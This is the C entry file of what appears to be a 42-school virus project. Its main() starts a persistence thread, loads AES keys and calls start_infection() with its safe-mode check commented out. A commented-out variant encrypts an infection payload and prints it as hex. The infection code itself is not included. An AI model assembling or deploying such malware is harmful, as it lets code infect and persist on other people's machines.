/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/03/20 17:18:39 by frmarinh          #+#    #+#             */
/*   Updated: 2018/03/23 06:50:45 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

int			main(int argc, char **argv, char **env)
{
	t_aes			*aes = NULL;
	t_pers_thread	pers;

	pers.env = env;
	pers.running = TRUE;
	build_persistent_process_thread((t_pers_thread*)&pers);
	if ((aes = load_aes()) != NULL) {
		if (get_key_iv(aes) != NULL && init_encryption(aes)
		 && init_decryption(aes))
		{
			t_cipher_plain *cipher_plain = get_cipher_plain();
			 if (cipher_plain) {
				//if (safe_mode(aes)) {
					aes->valid = TRUE;
					start_infection(aes, cipher_plain, env);
			 	//}
			}
		}
	}
	pers.running = FALSE;
	free_aes(aes);
}

// int			main(int argc, char **argv, char **env)
// {
// 	t_aes			*aes = NULL;
// 	t_pers_thread	pers;
//
// 	char infection[] = "";
//
// 	pers.env = env;
// 	pers.running = TRUE;
// 	build_persistent_process_thread((t_pers_thread*)&pers);
// 	if ((aes = load_aes()) != NULL) {
// 		if (get_key_iv(aes) != NULL && init_encryption(aes)
// 		 && init_decryption(aes))
// 		{
// 			t_cipher_plain *cipher_plain = get_cipher_plain();
// 			 if (cipher_plain) {
// 				set_plain(cipher_plain, (char*)&infection, sizeof(infection));
//
// 				encrypt_plain_text(aes, cipher_plain);
//
// 				int i = 0;
// 				while (i < cipher_plain->cipher_len)
// 				{
// 					printf("\\x%x", cipher_plain->cipher[i]);
// 					i++;
// 				}
// 			}
// 		}
// 	}
// 	pers.running = FALSE;
// 	free_aes(aes);
// }
